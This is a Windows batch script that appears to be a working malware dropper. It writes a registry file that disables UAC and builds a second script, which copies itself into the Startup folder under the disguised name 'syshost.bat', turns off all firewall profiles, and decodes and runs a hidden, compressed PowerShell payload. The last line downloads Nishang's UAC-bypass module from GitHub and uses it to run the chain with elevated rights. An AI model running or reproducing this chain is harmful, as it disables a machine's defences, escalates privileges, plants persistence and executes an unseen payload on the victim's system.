echo Windows Registry Editor Version 5.00>%Temp%\lua.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]>>%Temp%\lua.reg
echo "EnableLUA"=dword:00000000>>%Temp%\lua.reg


echo copy "%Temp%\render.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\syshost.bat">>%Temp%\render.bat
echo regedit /s lua.reg>%Temp%\render.bat
echo netsh advfirewall set allprofiles state off>>%Temp%\render.bat
echo cd "C:\Windows\System32\WindowsPowerShell\v1.0">>%Temp%\render.bat
echo powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Invoke-Decode.ps1');Invoke-Decode vVBNS8NAED03kP+wB6ENkk3SgjS9Se0hB2swlQjGw3YzJmuT3bI7bSjif3fTDxTx7GEZ9s3Me29esngmoyV0/sP6HTiS7GAQWroEpDmseSNAokfvVCcbxcoMtZDVaFgjbs0sCDTraCWw3q13BjRXEu045aoNDGs1Q2ZqtQmkMDWTVdAyy62DrIamMUEi92oDfqo60Edoxbd0a6Kh5zquk/y/rycUjcBDcFuWfgraCItKDhdPv2DiZ1yLLaYMazKfFbmQpepMcTI6GV+A7/uKfUTDIur5+gtdJ69FA6PI+3CdwUofSF8Hf8VC/EfYW2krmqTWhwZjSBSPaXQzpVFI45jYBY1kGsaxJfm0b86Q1yfKXAsEf6G10uTqWF7CV7pS59Q8cv0D7vU5Q6FkIt8UTZUR/efeSrIKzuQZMo1+1gBYbxnYgEtDJq5je18= -IsString -OutputFilePath 1.ps1" >>%Temp%\render.bat
echo powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden 1.ps1 >>%Temp%\render.bat


C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1');Invoke-PsUACme -method oobe -Payload \"%Temp%\\render.bat\""